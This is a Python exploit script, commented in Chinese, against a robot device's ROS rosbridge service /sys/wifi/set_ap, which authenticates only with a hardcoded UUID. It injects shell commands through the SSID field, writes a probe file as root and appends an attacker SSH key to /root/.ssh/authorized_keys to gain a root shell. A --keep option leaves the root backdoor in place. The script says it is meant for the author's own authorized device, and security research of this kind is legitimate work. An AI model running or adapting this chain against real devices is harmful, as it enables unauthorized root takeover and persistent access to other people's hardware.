#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
V1 · /sys/wifi/set_ap 命令注入 → 一键 root shell
=================================================
注入点: ae_sys 处理 /sys/wifi/set_ap (sys_task_msgs/srv/SetAP{ssid,password,api_key})
        把 ssid 拼进 system():
          timeout 8 ssh <访问令牌_01>.168.11.3 'sudo nmcli dev wifi connect "<SSID>" password "<PWD>" ifname wlan0'
门禁  : api_key 与硬编码 UUID 明文比对 (=无认证):
          51b00e11-112d-cbec-1828-17c0734624df

注入策略:
  ssid = x" & <cmd> ; "
  - `"` 闭合 nmcli 的引号; `&` 把 nmcli 丢后台(它扫不到假 SSID 会阻塞数秒,
    而整条命令被 timeout 8 包裹, 顺序执行会来不及跑我们的载荷)
  - 载荷经 base64 传递, 避开单引号禁区(整条串在 ssh '...' 单引号内)

链路:
  1. 本地生成临时 RSA keypair
  2. rosbridge(ws://192.168.11.3:9090) call_service /sys/wifi/set_ap
     → 设备以 root 执行: 写 /tmp/v1_pwned(id 输出) + 临时公钥追加进 /root/.ssh/authorized_keys
  3. ssh -i 临时私钥 <访问令牌_01>.168.11.3 → id/hostname → root shell 达成
  4. 默认自动清理(删注入公钥+探针文件); --keep 保留 root 登录能力

安全前提(2026-08-29 实测): 本机↔机器人走 rgmii0 有线, wlan0 本身 DOWN,
nmcli 失败不影响当前链路。仅限自有授权设备。
"""
import argparse
import base64
import io
import json
import os
import sys
import time

import paramiko
import websocket

VISION = "192.168.11.3"
WS_URL = f"ws://{VISION}:9090"
API_KEY = "<云凭据_01>"  # 硬编码门禁 UUID (明文比对)
MARKER = "v1-setap-poc"
PROBE = "/tmp/v1_pwned"


def call_setap(ssid: str, password: <密码_01> = "p"):
    """经 rosbridge 调 /sys/wifi/set_ap, 返回服务应答"""
    ws = websocket.create_connection(WS_URL, timeout=10)
    req = {"op": "call_service", "id": "v1", "service": "/sys/wifi/set_ap",
           "args": {"ssid": ssid, "password": <密码_01>, "api_key": <云凭据_01>}}
    print(f"[>] call_service /sys/wifi/set_ap")
    print(f"    ssid = {ssid!r}")
    ws.send(json.dumps(req))
    t0 = time.time()
    resp = None
    while time.time() - t0 < 15:
        try:
            ws.settimeout(15 - (time.time() - t0))
            m = json.loads(ws.recv())
        except Exception:
            break
        if m.get("op") == "service_response" and m.get("id") == "v1":
            resp = m
            break
    ws.close()
    return resp


def main():
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    ap = argparse.ArgumentParser(description="V1 set_ap 命令注入 → root shell")
    ap.add_argument("--keep", action="store_true", help="保留注入的 root 公钥(默认验证后清除)")
    ap.add_argument("--proof-only", action="store_true", help="只写 /tmp/v1_pwned 探针, 不注入公钥")
    args = ap.parse_args()

    print("=" * 66)
    print("[*] V1 · /sys/wifi/set_ap 命令注入 → 一键 root shell")
    print(f"[*] 目标: {VISION}  服务: sys_task_msgs/srv/SetAP  门禁: 硬编码UUID明文比对")
    print("=" * 66)

    # 1. 临时 keypair
    print("\n[1] 生成临时 RSA keypair（仅本次运行）")
    key = paramiko.RSAKey.generate(2048)
    buf = io.StringIO(); key.write_private_key(buf)
    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "v1_tmp_key.pem")
    with open(key_path, "w") as f:
        f.write(buf.getvalue())
    pubkey = f"ssh-rsa {key.get_base64()} {MARKER}"
    print(f"    私钥: {key_path}")

    # 2. 构造注入载荷（无单引号; & 后台化 nmcli）
    cmds = [f"id > {PROBE}"]
    if not args.proof_only:
        b64 = base64.b64encode(pubkey.encode()).decode()
        cmds.append(f"echo {b64} | base64 -d >> /root/.ssh/authorized_keys")
    inject = " ; ".join(cmds)
    ssid = f'x" & {inject} ; "'
    print(f"\n[2] 注入 ssid = {ssid[:90]}{'...' if len(ssid)>90 else ''}")

    resp = call_setap(ssid)
    if resp:
        print(f"[<] 服务应答: result={resp.get('result')} values={json.dumps(resp.get('values'), ensure_ascii=False)[:200]}")
    else:
        print("[<] 服务无应答（可能 timeout 8 截断，不影响已执行载荷）")
    time.sleep(3)

    # 3. 验证探针 + 拿 shell
    print("\n[3] 验证执行结果")
    if args.proof_only:
        c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(VISION, username="walker", password="<密码_01>", timeout=15)
        _, o, _ = c.exec_command(f"cat {PROBE} 2>/dev/null || echo 未生成")
        print(f"    {PROBE}: {o.read().decode().strip()}")
        c.close()
        return

    try:
        c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(VISION, username="root", key_filename=key_path, timeout=15,
                  look_for_keys=False, allow_agent=False)
        _, o, _ = c.exec_command(f"id; hostname; cat {PROBE}")
        out = o.read().decode().strip()
        print(f"[<] ssh root@{VISION} 输出:\n{out}")
        if "uid=0(root)" in out:
            print("\n[+] ROOT SHELL 达成 ✅  /sys/wifi/set_ap 命令注入 → root")
            print(f"    手动交互:  ssh -i {key_path} root@{VISION}")
        shell_ok = True
    except Exception as e:
        print(f"[!] root ssh 失败: {e}")
        print("[*] 回退验证: 用 walker 读探针（证明 root 已执行）")
        c = paramiko.SSHClient(); c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        c.connect(VISION, username="walker", password="<密码_01>", timeout=15)
        _, o, _ = c.exec_command(f"cat {PROBE} 2>/dev/null || echo 未生成")
        print(f"    {PROBE}: {o.read().decode().strip()}")
        shell_ok = False

    # 4. 清理（默认）
    if not args.keep:
        print("\n[4] 清理: 移除注入公钥 + 探针")
        cc = paramiko.SSHClient(); cc.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        cc.connect(VISION, username="walker", password="<密码_01>", timeout=15)
        cc.exec_command(f"sudo sed -i '/{MARKER}/d' /root/.ssh/authorized_keys; sudo rm -f {PROBE}; "
                        f"sudo grep -c {MARKER} /root/.ssh/authorized_keys 2>/dev/null || echo cleaned")
        time.sleep(1)
        _, o, _ = cc.exec_command(f"sudo grep -c {MARKER} /root/.ssh/authorized_keys 2>/dev/null; echo end")
        chk = o.read().decode().strip()
        print(f"    authorized_keys 残留标记: {chk}")
        cc.close()
        print("[+] 已恢复 ✅")
    else:
        print(f"\n[!] --keep: 公钥保留, 可直接 ssh -i {key_path} root@{VISION}")


if __name__ == "__main__":
    main()
